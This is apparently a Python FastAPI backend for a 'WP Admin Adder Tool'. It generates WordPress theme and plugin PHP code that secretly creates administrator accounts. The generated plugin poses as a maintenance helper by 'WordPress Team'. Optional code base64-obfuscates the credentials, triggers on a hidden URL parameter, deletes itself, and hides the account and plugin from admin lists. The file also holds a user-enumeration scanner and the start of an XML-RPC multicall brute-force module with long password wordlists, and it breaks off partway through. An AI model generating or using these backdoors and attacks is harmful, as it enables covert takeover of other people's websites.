from fastapi import FastAPI, APIRouter, HTTPException
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import base64
import hashlib
import secrets
import string
import httpx
import asyncio
import re
from urllib.parse import urlparse, urljoin


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ.get('DB_NAME', 'wp_admin_adder')]

# Create the main app without a prefix
app = FastAPI(title="WP Admin Adder Tool")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# Define Models
class AdminConfig(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    password: str = Field(..., min_length=6)
    email: str
    display_name: Optional[str] = None
    role: str = "administrator"

class StealthConfig(BaseModel):
    hide_from_user_list: bool = False
    hide_from_user_count: bool = False
    obfuscate_code: bool = False
    use_base64_encoding: bool = False

class TriggerConfig(BaseModel):
    trigger_type: str = "immediate"  # immediate, url_param, scheduled
    url_param_key: Optional[str] = None
    url_param_value: Optional[str] = None
    scheduled_time: Optional[str] = None
    auto_delete_after_run: bool = False

class GenerateRequest(BaseModel):
    code_type: str = "theme"  # theme, plugin
    admin_config: AdminConfig
    stealth_config: StealthConfig
    trigger_config: TriggerConfig

class GeneratedCode(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    code_type: str
    admin_username: str
    admin_email: str
    php_code: str
    stealth_enabled: bool
    trigger_type: str
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class HistoryItem(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str
    code_type: str
    admin_username: str
    admin_email: str
    stealth_enabled: bool
    trigger_type: str
    created_at: datetime


def generate_random_string(length=8):
    return ''.join(secrets.choice(string.ascii_lowercase) for _ in range(length))


def obfuscate_string(s: str) -> str:
    """Simple obfuscation using base64"""
    return base64.b64encode(s.encode()).decode()


def generate_theme_code(admin_config: AdminConfig, stealth_config: StealthConfig, trigger_config: TriggerConfig) -> str:
    """Generate PHP code for functions.php"""
    
    func_name = f"wp_init_{generate_random_string()}"
    hook_name = f"init_{generate_random_string()}"
    
    username = admin_config.username
    password = admin_config.password
    email = admin_config.email
    display_name = admin_config.display_name or admin_config.username
    role = admin_config.role
    
    # Build the core user creation code
    if stealth_config.use_base64_encoding:
        user_code = f'''
    $u = base64_decode('{obfuscate_string(username)}');
    $p = base64_decode('{obfuscate_string(password)}');
    $e = base64_decode('{obfuscate_string(email)}');
    $d = base64_decode('{obfuscate_string(display_name)}');
    $r = base64_decode('{obfuscate_string(role)}');'''
    else:
        user_code = f'''
    $u = '{username}';
    $p = '{password}';
    $e = '{email}';
    $d = '{display_name}';
    $r = '{role}';'''
    
    # Build trigger condition
    if trigger_config.trigger_type == "url_param":
        param_key = trigger_config.url_param_key or "wp_debug"
        param_value = trigger_config.url_param_value or "1"
        trigger_condition = f"if (!isset($_GET['{param_key}']) || $_GET['{param_key}'] !== '{param_value}') return;"
    elif trigger_config.trigger_type == "scheduled":
        scheduled_time = trigger_config.scheduled_time or "2025-12-31"
        trigger_condition = f"if (strtotime('{scheduled_time}') > time()) return;"
    else:
        trigger_condition = ""
    
    # Build auto-delete code
    auto_delete_code = ""
    if trigger_config.auto_delete_after_run:
        auto_delete_code = f'''
    // Auto-delete this code after execution
    $file = __FILE__;
    $content = file_get_contents($file);
    $pattern = '/\\/\\/ START {func_name}.*?\\/\\/ END {func_name}/s';
    $content = preg_replace($pattern, '', $content);
    file_put_contents($file, $content);'''
    
    # Build stealth code for hiding from user list
    stealth_code = ""
    if stealth_config.hide_from_user_list:
        stealth_func = f"hide_user_{generate_random_string()}"
        stealth_code = f'''

// Hide admin from user list
add_action('pre_user_query', function($query) {{
    global $wpdb;
    $hidden_user = '{username}';
    $query->query_where = str_replace(
        'WHERE 1=1',
        "WHERE 1=1 AND {{$wpdb->users}}.user_login != '{{$hidden_user}}'",
        $query->query_where
    );
}});'''
    
    if stealth_config.hide_from_user_count:
        stealth_code += f'''

// Hide from user count
add_filter('views_users', function($views) {{
    $hidden_user = get_user_by('login', '{username}');
    if ($hidden_user) {{
        foreach ($views as $role => $view) {{
            if (preg_match('/\\(([0-9]+)\\)/', $view, $matches)) {{
                $count = intval($matches[1]) - 1;
                $views[$role] = preg_replace('/\\([0-9]+\\)/', '(' . $count . ')', $view);
            }}
        }}
    }}
    return $views;
}});'''
    
    # Combine all code
    php_code = f'''<?php
// START {func_name}
// WP Admin Auto-Add - Theme Version
// Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

add_action('init', function() {{
    {trigger_condition}
    {user_code}
    
    if (!username_exists($u) && !email_exists($e)) {{
        $user_id = wp_create_user($u, $p, $e);
        if (!is_wp_error($user_id)) {{
            $user = new WP_User($user_id);
            $user->set_role($r);
            wp_update_user(array(
                'ID' => $user_id,
                'display_name' => $d
            ));
            {auto_delete_code}
        }}
    }}
}});
{stealth_code}
// END {func_name}
?>'''
    
    return php_code


def generate_plugin_code(admin_config: AdminConfig, stealth_config: StealthConfig, trigger_config: TriggerConfig) -> str:
    """Generate PHP code as a WordPress plugin"""
    
    plugin_name = f"WP Maintenance Helper {generate_random_string(4).upper()}"
    func_name = f"wp_maint_{generate_random_string()}"
    
    username = admin_config.username
    password = admin_config.password
    email = admin_config.email
    display_name = admin_config.display_name or admin_config.username
    role = admin_config.role
    
    # Build the core user creation code
    if stealth_config.use_base64_encoding:
        user_code = f'''
    $u = base64_decode('{obfuscate_string(username)}');
    $p = base64_decode('{obfuscate_string(password)}');
    $e = base64_decode('{obfuscate_string(email)}');
    $d = base64_decode('{obfuscate_string(display_name)}');
    $r = base64_decode('{obfuscate_string(role)}');'''
    else:
        user_code = f'''
    $u = '{username}';
    $p = '{password}';
    $e = '{email}';
    $d = '{display_name}';
    $r = '{role}';'''
    
    # Build trigger condition
    if trigger_config.trigger_type == "url_param":
        param_key = trigger_config.url_param_key or "wp_debug"
        param_value = trigger_config.url_param_value or "1"
        trigger_condition = f"if (!isset($_GET['{param_key}']) || $_GET['{param_key}'] !== '{param_value}') return;"
    elif trigger_config.trigger_type == "scheduled":
        scheduled_time = trigger_config.scheduled_time or "2025-12-31"
        trigger_condition = f"if (strtotime('{scheduled_time}') > time()) return;"
    else:
        trigger_condition = ""
    
    # Build auto-delete code (self-deactivate for plugin)
    auto_delete_code = ""
    if trigger_config.auto_delete_after_run:
        auto_delete_code = f'''
            // Self-deactivate plugin after execution
            deactivate_plugins(plugin_basename(__FILE__));
            // Delete plugin file
            @unlink(__FILE__);'''
    
    # Build stealth code
    stealth_code = ""
    if stealth_config.hide_from_user_list:
        stealth_code = f'''

// Hide admin from user list
add_action('pre_user_query', function($query) {{
    global $wpdb;
    $hidden_user = '{username}';
    $query->query_where = str_replace(
        'WHERE 1=1',
        "WHERE 1=1 AND {{$wpdb->users}}.user_login != '{{$hidden_user}}'",
        $query->query_where
    );
}});'''
    
    if stealth_config.hide_from_user_count:
        stealth_code += f'''

// Hide from user count
add_filter('views_users', function($views) {{
    $hidden_user = get_user_by('login', '{username}');
    if ($hidden_user) {{
        foreach ($views as $role => $view) {{
            if (preg_match('/\\(([0-9]+)\\)/', $view, $matches)) {{
                $count = intval($matches[1]) - 1;
                $views[$role] = preg_replace('/\\([0-9]+\\)/', '(' . $count . ')', $view);
            }}
        }}
    }}
    return $views;
}});'''
    
    # Plugin hide from plugin list
    plugin_stealth = ""
    if stealth_config.obfuscate_code:
        plugin_stealth = f'''

// Hide plugin from plugins list
add_filter('all_plugins', function($plugins) {{
    $plugin_file = plugin_basename(__FILE__);
    if (isset($plugins[$plugin_file])) {{
        unset($plugins[$plugin_file]);
    }}
    return $plugins;
}});'''
    
    php_code = f'''<?php
/**
 * Plugin Name: {plugin_name}
 * Description: WordPress maintenance and optimization helper.
 * Version: 1.0.0
 * Author: WordPress Team
 * License: GPL2
 */

if (!defined('ABSPATH')) exit;

// Main initialization
add_action('init', function() {{
    {trigger_condition}
    {user_code}
    
    if (!username_exists($u) && !email_exists($e)) {{
        $user_id = wp_create_user($u, $p, $e);
        if (!is_wp_error($user_id)) {{
            $user = new WP_User($user_id);
            $user->set_role($r);
            wp_update_user(array(
                'ID' => $user_id,
                'display_name' => $d
            ));
            {auto_delete_code}
        }}
    }}
}});
{stealth_code}
{plugin_stealth}
?>'''
    
    return php_code


# API Routes
@api_router.get("/")
async def root():
    return {"message": "WP Admin Adder Tool API", "version": "1.0.0"}


@api_router.post("/generate", response_model=GeneratedCode)
async def generate_code(request: GenerateRequest):
    """Generate PHP code for adding WordPress admin"""
    try:
        if request.code_type == "theme":
            php_code = generate_theme_code(
                request.admin_config,
                request.stealth_config,
                request.trigger_config
            )
        else:
            php_code = generate_plugin_code(
                request.admin_config,
                request.stealth_config,
                request.trigger_config
            )
        
        # Create generated code record
        generated = GeneratedCode(
            code_type=request.code_type,
            admin_username=request.admin_config.username,
            admin_email=request.admin_config.email,
            php_code=php_code,
            stealth_enabled=request.stealth_config.hide_from_user_list or request.stealth_config.obfuscate_code,
            trigger_type=request.trigger_config.trigger_type
        )
        
        # Save to database
        doc = generated.model_dump()
        doc['created_at'] = doc['created_at'].isoformat()
        await db.generated_codes.insert_one(doc)
        
        return generated
    except Exception as e:
        logging.error(f"Error generating code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.get("/history", response_model=List[HistoryItem])
async def get_history():
    """Get history of generated codes"""
    try:
        codes = await db.generated_codes.find(
            {},
            {"_id": 0, "php_code": 0}
        ).sort("created_at", -1).to_list(100)
        
        for code in codes:
            if isinstance(code['created_at'], str):
                code['created_at'] = datetime.fromisoformat(code['created_at'])
        
        return codes
    except Exception as e:
        logging.error(f"Error fetching history: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.get("/history/{code_id}")
async def get_code_by_id(code_id: str):
    """Get specific generated code by ID"""
    try:
        code = await db.generated_codes.find_one({"id": code_id}, {"_id": 0})
        if not code:
            raise HTTPException(status_code=404, detail="Code not found")
        
        if isinstance(code['created_at'], str):
            code['created_at'] = datetime.fromisoformat(code['created_at'])
        
        return code
    except HTTPException:
        raise
    except Exception as e:
        logging.error(f"Error fetching code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.delete("/history/{code_id}")
async def delete_code(code_id: str):
    """Delete a generated code from history"""
    try:
        result = await db.generated_codes.delete_one({"id": code_id})
        if result.deleted_count == 0:
            raise HTTPException(status_code=404, detail="Code not found")
        return {"message": "Code deleted successfully"}
    except HTTPException:
        raise
    except Exception as e:
        logging.error(f"Error deleting code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.delete("/history")
async def clear_history():
    """Clear all history"""
    try:
        await db.generated_codes.delete_many({})
        return {"message": "History cleared successfully"}
    except Exception as e:
        logging.error(f"Error clearing history: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ==========================================
# WP SECURITY SCANNER
# ==========================================

class ScanRequest(BaseModel):
    target_url: str
    scan_types: List[str] = ["user_enum", "xmlrpc", "security_headers", "wp_version"]

class ScanResult(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    target_url: str
    scan_date: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    is_wordpress: bool = False
    wp_version: Optional[str] = None
    users_found: List[Dict[str, Any]] = []
    xmlrpc_status: Dict[str, Any] = {}
    security_headers: Dict[str, Any] = {}
    vulnerabilities: List[Dict[str, Any]] = []
    recommendations: List[str] = []


def normalize_url(url: str) -> str:
    """Normalize and validate URL"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


async def check_wordpress(client: httpx.AsyncClient, base_url: str) -> tuple:
    """Check if site is WordPress and get version"""
    is_wp = False
    version = None
    
    try:
        # Check wp-login.php
        resp = await client.get(f"{base_url}/wp-login.php", follow_redirects=True)
        if resp.status_code == 200 and 'wordpress' in resp.text.lower():
            is_wp = True
        
        # Check readme.html for version
        resp = await client.get(f"{base_url}/readme.html")
        if resp.status_code == 200:
            match = re.search(r'Version\s*([\d.]+)', resp.text)
            if match:
                version = match.group(1)
                is_wp = True
        
        # Check wp-includes
        resp = await client.get(f"{base_url}/wp-includes/js/jquery/jquery.min.js")
        if resp.status_code == 200:
            is_wp = True
        
        # Check meta generator
        resp = await client.get(base_url)
        if resp.status_code == 200:
            match = re.search(r'<meta name="generator" content="WordPress\s*([\d.]*)"', resp.text)
            if match:
                is_wp = True
                if match.group(1):
                    version = match.group(1)
                    
    except Exception as e:
        logging.error(f"Error checking WordPress: {e}")
    
    return is_wp, version


async def enumerate_users(client: httpx.AsyncClient, base_url: str) -> List[Dict]:
    """Enumerate WordPress users using multiple methods"""
    users = []
    found_ids = set()
    
    # Method 1: REST API (wp-json/wp/v2/users)
    try:
        resp = await client.get(f"{base_url}/wp-json/wp/v2/users", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            for user in data:
                if user.get('id') not in found_ids:
                    users.append({
                        "id": user.get('id'),
                        "username": user.get('slug'),
                        "name": user.get('name'),
                        "method": "REST API",
                        "url": user.get('link')
                    })
                    found_ids.add(user.get('id'))
    except Exception as e:
        logging.debug(f"REST API enum failed: {e}")
    
    # Method 2: Author archive enumeration (?author=N)
    for i in range(1, 11):
        try:
            resp = await client.get(f"{base_url}/?author={i}", follow_redirects=True, timeout=5)
            if resp.status_code == 200:
                # Check URL for username
                match = re.search(r'/author/([^/]+)/?', str(resp.url))
                if match and i not in found_ids:
                    username = match.group(1)
                    users.append({
                        "id": i,
                        "username": username,
                        "name": username,
                        "method": "Author Archive",
                        "url": str(resp.url)
                    })
                    found_ids.add(i)
        except Exception:
            continue
    
    # Method 3: oEmbed API
    try:
        resp = await client.get(f"{base_url}/wp-json/oembed/1.0/embed?url={base_url}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            author = data.get('author_name')
            author_url = data.get('author_url')
            if author and author_url:
                # Extract user ID from URL if possible
                match = re.search(r'/author/([^/]+)/?', author_url)
                if match:
                    username = match.group(1)
                    if username not in [u['username'] for u in users]:
                        users.append({
                            "id": None,
                            "username": username,
                            "name": author,
                            "method": "oEmbed API",
                            "url": author_url
                        })
    except Exception as e:
        logging.debug(f"oEmbed enum failed: {e}")
    
    # Method 4: RSS Feed
    try:
        resp = await client.get(f"{base_url}/feed/", timeout=10)
        if resp.status_code == 200:
            # Find dc:creator tags
            creators = re.findall(r'<dc:creator><!\[CDATA\[([^\]]+)\]\]></dc:creator>', resp.text)
            for creator in set(creators):
                if creator not in [u['username'] for u in users] and creator not in [u['name'] for u in users]:
                    users.append({
                        "id": None,
                        "username": creator.lower().replace(' ', ''),
                        "name": creator,
                        "method": "RSS Feed",
                        "url": None
                    })
    except Exception as e:
        logging.debug(f"RSS enum failed: {e}")
    
    # Method 5: Login error message enumeration
    try:
        # Test with common usernames
        test_users = ['admin', 'administrator', 'root', 'user', 'test']
        for test_user in test_users:
            resp = await client.post(
                f"{base_url}/wp-login.php",
                data={"log": test_user, "pwd": "wrongpassword123!@#"},
                follow_redirects=True,
                timeout=10
            )
            if resp.status_code == 200:
                # Check if user exists based on error message
                if 'incorrect' in resp.text.lower() or 'password' in resp.text.lower():
                    if test_user not in [u['username'] for u in users]:
                        users.append({
                            "id": None,
                            "username": test_user,
                            "name": test_user,
                            "method": "Login Error",
                            "url": None
                        })
                # Break if rate limited
                if 'too many' in resp.text.lower() or 'slow down' in resp.text.lower():
                    break
    except Exception as e:
        logging.debug(f"Login error enum failed: {e}")
    
    return users


async def check_xmlrpc(client: httpx.AsyncClient, base_url: str) -> Dict:
    """Check XMLRPC vulnerabilities"""
    result = {
        "enabled": False,
        "url": f"{base_url}/xmlrpc.php",
        "methods_available": [],
        "vulnerabilities": [],
        "pingback_enabled": False,
        "multicall_enabled": False
    }
    
    try:
        # Check if xmlrpc.php exists
        resp = await client.get(f"{base_url}/xmlrpc.php", timeout=10)
        if resp.status_code == 405 or (resp.status_code == 200 and 'xml-rpc server accepts post requests only' in resp.text.lower()):
            result["enabled"] = True
        
        if not result["enabled"]:
            resp = await client.post(
                f"{base_url}/xmlrpc.php",
                content='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                headers={"Content-Type": "text/xml"},
                timeout=10
            )
            if resp.status_code == 200 and 'methodresponse' in resp.text.lower():
                result["enabled"] = True
        
        if result["enabled"]:
            # Get available methods
            resp = await client.post(
                f"{base_url}/xmlrpc.php",
                content='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                headers={"Content-Type": "text/xml"},
                timeout=15
            )
            if resp.status_code == 200:
                methods = re.findall(r'<string>([^<]+)</string>', resp.text)
                result["methods_available"] = methods[:20]  # Limit to 20
                
                # Check for dangerous methods
                if 'wp.getUsersBlogs' in methods:
                    result["vulnerabilities"].append({
                        "name": "User Enumeration via XMLRPC",
                        "severity": "Medium",
                        "method": "wp.getUsersBlogs",
                        "description": "Allows username enumeration through authentication attempts"
                    })
                
                if 'pingback.ping' in methods:
                    result["pingback_enabled"] = True
                    result["vulnerabilities"].append({
                        "name": "Pingback DDoS",
                        "severity": "Medium", 
                        "method": "pingback.ping",
                        "description": "Site can be used as DDoS amplification vector"
                    })
                
                if 'system.multicall' in methods:
                    result["multicall_enabled"] = True
                    result["vulnerabilities"].append({
                        "name": "Multicall Brute Force Amplification",
                        "severity": "High",
                        "method": "system.multicall",
                        "description": "Allows multiple login attempts in single request, bypassing rate limits"
                    })
                
                if 'wp.getUsers' in methods:
                    result["vulnerabilities"].append({
                        "name": "User Information Disclosure",
                        "severity": "Medium",
                        "method": "wp.getUsers",
                        "description": "May expose user information with valid credentials"
                    })
                    
    except Exception as e:
        logging.error(f"XMLRPC check error: {e}")
        result["error"] = str(e)
    
    return result


async def check_security_headers(client: httpx.AsyncClient, base_url: str) -> Dict:
    """Check security headers"""
    result = {
        "headers_present": {},
        "headers_missing": [],
        "score": 0
    }
    
    important_headers = {
        "X-Frame-Options": "Prevents clickjacking attacks",
        "X-Content-Type-Options": "Prevents MIME type sniffing",
        "X-XSS-Protection": "Enables browser XSS filter",
        "Strict-Transport-Security": "Enforces HTTPS connections",
        "Content-Security-Policy": "Prevents XSS and injection attacks",
        "Referrer-Policy": "Controls referrer information",
        "Permissions-Policy": "Controls browser features"
    }
    
    try:
        resp = await client.get(base_url, timeout=10)
        headers = dict(resp.headers)
        
        for header, desc in important_headers.items():
            header_lower = header.lower()
            found = False
            for h in headers:
                if h.lower() == header_lower:
                    result["headers_present"][header] = {
                        "value": headers[h],
                        "description": desc
                    }
                    found = True
                    break
            
            if not found:
                result["headers_missing"].append({
                    "header": header,
                    "description": desc
                })
        
        # Calculate score
        result["score"] = int((len(result["headers_present"]) / len(important_headers)) * 100)
        
    except Exception as e:
        logging.error(f"Security headers check error: {e}")
        result["error"] = str(e)
    
    return result


def generate_recommendations(scan_result: Dict) -> List[str]:
    """Generate security recommendations based on scan results"""
    recommendations = []
    
    # WordPress version
    if scan_result.get("wp_version"):
        recommendations.append(f"⚠️ WordPress version {scan_result['wp_version']} terdeteksi. Pastikan selalu update ke versi terbaru.")
    
    # User enumeration
    if scan_result.get("users_found"):
        recommendations.append("🔒 User enumeration aktif! Disable REST API user endpoint atau gunakan plugin security.")
        recommendations.append("💡 Tambahkan kode ini di functions.php: add_filter('rest_endpoints', function($endpoints) { unset($endpoints['/wp/v2/users']); return $endpoints; });")
    
    # XMLRPC
    xmlrpc = scan_result.get("xmlrpc_status", {})
    if xmlrpc.get("enabled"):
        recommendations.append("⛔ XMLRPC aktif! Disable jika tidak digunakan untuk meningkatkan keamanan.")
        recommendations.append("💡 Tambahkan di .htaccess: <Files xmlrpc.php>\\nOrder Deny,Allow\\nDeny from all\\n</Files>")
        
        if xmlrpc.get("multicall_enabled"):
            recommendations.append("🚨 KRITIS: system.multicall aktif - rentan terhadap brute force amplification!")
        
        if xmlrpc.get("pingback_enabled"):
            recommendations.append("⚠️ Pingback aktif - site bisa digunakan untuk DDoS amplification.")
    
    # Security headers
    headers = scan_result.get("security_headers", {})
    if headers.get("score", 100) < 50:
        recommendations.append("🛡️ Security headers kurang! Tambahkan headers berikut di .htaccess atau nginx config.")
        for missing in headers.get("headers_missing", [])[:3]:
            recommendations.append(f"  - {missing['header']}: {missing['description']}")
    
    # General recommendations
    recommendations.append("✅ Gunakan plugin security seperti Wordfence atau Sucuri")
    recommendations.append("✅ Aktifkan 2FA untuk semua admin users")
    recommendations.append("✅ Ubah default login URL (/wp-admin) menggunakan plugin")
    recommendations.append("✅ Limit login attempts untuk mencegah brute force")
    
    return recommendations


@api_router.post("/scan", response_model=ScanResult)
async def scan_wordpress(request: ScanRequest):
    """Scan WordPress site for security issues"""
    try:
        base_url = normalize_url(request.target_url)
        
        async with httpx.AsyncClient(
            timeout=30,
            follow_redirects=True,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            },
            verify=False  # Allow self-signed certs
        ) as client:
            
            result = {
                "id": str(uuid.uuid4()),
                "target_url": base_url,
                "scan_date": datetime.now(timezone.utc),
                "is_wordpress": False,
                "wp_version": None,
                "users_found": [],
                "xmlrpc_status": {},
                "security_headers": {},
                "vulnerabilities": [],
                "recommendations": []
            }
            
            # Check if WordPress
            is_wp, version = await check_wordpress(client, base_url)
            result["is_wordpress"] = is_wp
            result["wp_version"] = version
            
            if not is_wp:
                result["recommendations"] = ["❌ Target bukan WordPress atau tidak dapat diakses"]
                return ScanResult(**result)
            
            # Run scans based on requested types
            if "user_enum" in request.scan_types:
                result["users_found"] = await enumerate_users(client, base_url)
            
            if "xmlrpc" in request.scan_types:
                result["xmlrpc_status"] = await check_xmlrpc(client, base_url)
                # Add XMLRPC vulnerabilities to main list
                for vuln in result["xmlrpc_status"].get("vulnerabilities", []):
                    result["vulnerabilities"].append(vuln)
            
            if "security_headers" in request.scan_types:
                result["security_headers"] = await check_security_headers(client, base_url)
            
            # Generate recommendations
            result["recommendations"] = generate_recommendations(result)
            
            # Save to database
            doc = result.copy()
            doc['scan_date'] = doc['scan_date'].isoformat()
            await db.scan_results.insert_one(doc)
            
            return ScanResult(**result)
            
    except Exception as e:
        logging.error(f"Scan error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.get("/scans", response_model=List[Dict])
async def get_scan_history():
    """Get scan history"""
    try:
        scans = await db.scan_results.find(
            {},
            {"_id": 0, "users_found": 0, "xmlrpc_status": 0, "security_headers": 0}
        ).sort("scan_date", -1).to_list(50)
        return scans
    except Exception as e:
        logging.error(f"Error fetching scans: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@api_router.get("/scans/{scan_id}")
async def get_scan_by_id(scan_id: str):
    """Get specific scan result"""
    try:
        scan = await db.scan_results.find_one({"id": scan_id}, {"_id": 0})
        if not scan:
            raise HTTPException(status_code=404, detail="Scan not found")
        return scan
    except HTTPException:
        raise
    except Exception as e:
        logging.error(f"Error fetching scan: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ==========================================
# XMLRPC MULTICALL BRUTE FORCE
# ==========================================

# Base common passwords
BASE_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "shadow", "master", "666666", "qwertyuiop",
    "123321", "mustang", "1234567890", "654321", "superman",
    "1qaz2wsx", "7777777", "121212", "000000", "qazwsx",
    "123qwe", "killer", "trustno1", "jordan", "zxcvbnm",
    "asdfgh", "hunter", "buster", "soccer", "harley",
    "batman", "tigger", "sunshine", "iloveyou", "charlie",
    "robert", "thomas", "hockey", "ranger", "daniel",
    "starwars", "112233", "computer", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313",
    "freedom", "777777", "pass", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese",
    "amanda", "summer", "love", "ashley", "nicole",
    "chelsea", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix"
]

# WordPress specific passwords
WP_SPECIFIC_PASSWORDS = [
    # Common WP admin passwords
    "admin", "administrator", "Admin", "Administrator", "ADMIN",
    "admin123", "admin1234", "admin12345", "admin123456",
    "Admin123", "Admin@123", "Admin123!", "admin@123",
    "administrator123", "Administrator123",
    "root", "Root", "root123", "Root123", "toor",
    "password", "Password", "PASSWORD", "pass", "Pass",
    "password1", "password12", "password123", "password1234",
    "Password1", "Password12", "Password123", "Password1234",
    "Password!", "Password1!", "P@ssw0rd", "P@ssword", "P@ssword1",
    "pass123", "Pass123", "pass1234", "Pass1234",
    
    # WordPress related
    "wordpress", "WordPress", "Wordpress", "WORDPRESS",
    "wp", "WP", "Wp", "wpuser", "WPuser",
    "wp123", "wp1234", "WP123", "WP1234",
    "wpadmin", "WPadmin", "Wpadmin", "wp-admin",
    "wppass", "WPpass", "wppassword",
    "wordpress123", "Wordpress123", "WordPress123",
    "wordpress1", "wordpress12", "wordpress1234",
    "blog", "Blog", "blog123", "Blog123",
    "website", "Website", "website123",
    "site", "Site", "site123", "Site123",
    "web", "Web", "web123", "webmaster",
    "cms", "CMS", "cms123",
    
    # Test/Demo accounts
    "test", "Test", "TEST", "test123", "Test123", "test1234",
    "testing", "Testing", "testing123",
    "demo", "Demo", "DEMO", "demo123", "Demo123",
    "guest", "Guest", "guest123", "Guest123",
    "user", "User", "USER", "user123", "User123",
    "temp", "Temp", "temp123", "Temp123",
    "default", "Default", "default123",
    
    # Common patterns with special chars
    "!@#$%^&*", "123!@#", "abc!@#", "qwerty!@#",
    "admin!@#", "pass!@#", "test!@#",
    "@dmin123", "@dm1n", "adm1n", "4dmin", "4dm1n",
    "p@ssword", "p@ss", "p@ss123", "p@ssw0rd",
    
    # Keyboard patterns
    "qwerty", "QWERTY", "Qwerty", "qwerty123",
    "asdfgh", "ASDFGH", "asdfgh123",
    "zxcvbn", "ZXCVBN", "zxcvbn123",
    "1q2w3e", "1q2w3e4r", "1q2w3e4r5t",
    "q1w2e3", "q1w2e3r4", "1qaz2wsx", "1qaz@WSX",
    "qazwsx", "qazwsxedc", "zaq12wsx",
    
    # Indonesian common
    "rahasia", "Rahasia", "rahasia123",
    "password1", "katasandi", "sandi123",
    "indonesia", "Indo123", "jakarta",
    
    # Company/site patterns
    "company", "Company", "company123",
    "welcome", "Welcome", "welcome1", "Welcome1", "welcome123",
    "changeme", "Changeme", "changeme123",
    "letmein", "Letmein", "letmein123",
]

# Year-based passwords (2020-2026)
YEAR_PASSWORDS = []
for year in range(2020, 2027):
    YEAR_PASSWORDS.extend([
        str(year), f"pass{year}", f"Pass{year}", f"password{year}",
        f"Password{year}", f"admin{year}", f"Admin{year}",
        f"{year}admin", f"{year}pass", f"{year}password",
        f"wp{year}", f"wordpress{year}", f"site{year}",
        f"@{year}", f"!{year}", f"#{year}",
    ])

# Month passwords
MONTH_PASSWORDS = []
months = ["january", "february", "march", "april", "may", "june", 
          "july", "august", "september", "october", "november", "december",
          "jan", "feb", "mar", "apr", "jun", "jul", "aug", "sep", "oct", "nov", "dec"]
for month in months:
    MONTH_PASSWORDS.extend([
        month, month.capitalize(), f"{month}123", f"{month.capitalize()}123",
        f"{month}2024", f"{month}2025"
    ])

# Combine all default passwords
DEFAULT_PASSWORDS = list(dict.fromkeys(
    BASE_PASSWORDS + WP_SPECIFIC_PASSWORDS + YEAR_PASSWORDS + MONTH_PASSWORDS
))


def generate_username_based_passwords(username: str) -> List[str]:
    """Generate password variations based on username"""
    passwords = []
    u = username.lower()
    U = username.capitalize()
    
    # Direct username variations
    passwords.extend([
        username, u, U, username.upper(),
        f"{u}123", f"{u}1234", f"{u}12345", f"{u}123456",
        f"{U}123", f"{U}1234", f"{U}12345",
        f"{u}!", f"{u}!!", f"{u}@", f"{u}#",
        f"{u}@123", f"{u}!123", f"{u}#123",
        f"{U}!", f"{U}@", f"{U}@123", f"{U}!123",
        
        # Reversed
        u[::-1], f"{u[::-1]}123",
        
        # With numbers
        f"{u}1", f"{u}2", f"{u}01", f"{u}00",
        f"{u}99", f"{u}007", f"{u}666", f"{u}777",
        
        # Leetspeak variations
        u.replace('a', '@').replace('e', '3').replace('i', '1').replace('o', '0'),
        u.replace('a', '4').replace('e', '3').replace('s', '$'),
        
        # Common suffixes
        f"{u}admin", f"{u}pass", f"{u}password",
        f"{u}wp", f"{u}wordpress", f"{u}site",
        f"admin{u}", f"pass{u}", f"wp{u}",
        
        # Year suffixes
        f"{u}2024", f"{u}2025", f"{u}2023",
        f"{U}2024", f"{U}2025",
        f"{u}@2024", f"{u}@2025",
        
        # Double
        f"{u}{u}", f"{u}{u}123",
        
        # First letter caps with numbers
        f"{U}1", f"{U}12", f"{U}123!", f"{U}1234!",
        f"{U}@1", f"{U}@12", f"{U}@123",
    ])
    
    # If username has numbers, try without
    if any(c.isdigit() for c in username):
        base = ''.join(c for c in username if not c.isdigit())
        if base:
            passwords.extend([base, f"{base}123", f"{base}1234"])
    
    return list(dict.fromkeys(passwords))


class BruteForceRequest(BaseModel):
    target_url: str
    usernames: List[str]
    passwords: Optional[List[str]] = None
    use_default_wordlist: bool = True
    generate_username_passwords: bool = True  # NEW: Generate passwords from usernames
    batch_size: int = 100  # passwords per multicall request

class BruteForceResult(BaseModel):
